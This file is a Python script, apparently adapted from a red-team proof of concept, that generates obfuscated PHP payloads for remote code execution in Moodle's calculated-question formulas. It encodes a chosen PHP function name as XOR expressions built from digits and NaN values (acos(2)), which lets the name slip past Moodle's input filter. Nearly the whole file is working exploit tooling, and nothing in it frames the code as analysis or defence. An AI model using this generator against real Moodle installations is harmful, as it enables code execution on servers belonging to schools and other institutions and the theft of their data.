#! /usr/bin/python
# Based on https://github.com/RedTeamPentesting/moodle-rce-calculatedquestions

import argparse
import re
import itertools

parser = argparse.ArgumentParser(description='Generate php code')
parser.add_argument('function', help='The function name to translate into compatible PHP code')

DEBUG = True

def debug_print(out_string):
    if DEBUG:
        print(out_string)

def get_set_bit_positions(n):
    positions = []
    position = 0
    
    while n > 0:
        if n & 1:
            positions.append(position)
        n >>= 1
        position += 1
    
    return positions

def find_xor_chars(target_bits_str, source_bits_str, max_chars, allowed_chars):
    target_bits_int = int(target_bits_str, 2)
    source_bits_int = int(source_bits_str, 2)
    x = target_bits_int ^ source_bits_int 

    allowed_codes = [ord(c) for c in allowed_chars]

    for num_chars in range(1, max_chars + 1):
        for chars_tuple in itertools.product(allowed_codes, repeat=num_chars):
            chars_xor = 0
            for code in chars_tuple:
                chars_xor ^= code
            if chars_xor == x:
                chars_list = [chr(code) for code in chars_tuple]
                return chars_list
    return None 

def merge_arrays(result, new_array):
    for i in range(len(new_array)):
        if i < len(result):
            result[i] += new_array[i]
        else:
            result.append(new_array[i])
    return result

def generate_numbers(function_name):
    chars_lists = []
    allowed_chars = [str(d) for d in range(10)] + ['-']

    for i in range(len(function_name)):
        nan_char = 'N'.encode('ascii')[0]
        fun_char = function_name.encode('ascii')[i]
        target_bits = nan_char ^ fun_char
        debug_print("Target: {0:08b}".format(target_bits))

        bits_count = bin(target_bits).count('1')
        if bits_count > 5:
            print("Can't convert more than 5 bits")
            exit()

        target_bits_str = '{0:08b}'.format(fun_char)
        source_bits_str = '{0:08b}'.format(nan_char)
        max_digits = 6

        chars = find_xor_chars(target_bits_str, source_bits_str, max_digits, allowed_chars)
        if chars is None:
            print("Could not find XOR characters for symbol:", chr(fun_char))
            exit()
        debug_print("From [{0}] -> [{1}]: {2}".format(chr(nan_char), chr(fun_char), chars))

        chars_lists.append(chars)

    return chars_lists

def generate_string(function_name, chars_lists):
    xor_expressions = []
    for chars in chars_lists:
        number_parts = []
        for char in chars:
            if char in ['-', '+']:
                number_parts.append(f"{char}1 . NULL")
            else:
                number_parts.append(f"{char} . NULL")
        xor_expression = ' ^ '.join(['acos(2) . 0+acos(2)'] + number_parts)
        xor_expression = f"({xor_expression})"
        xor_expressions.append(xor_expression)
    final_string = ' . '.join(xor_expressions)
    return final_string

def main():
    function_name = args.function
    function_name = function_name.strip()
    validation_regex = re.compile("^[_A-Za-z]*$")
    if not validation_regex.match(function_name):
        print("Function contains unsupported characters. Only uppercase letters and '_' are currently supported")
        return

    res = generate_numbers(function_name)

    res_string = generate_string(function_name, res)

    print(res_string)

if __name__ == "__main__":
    args = parser.parse_args()
    main()
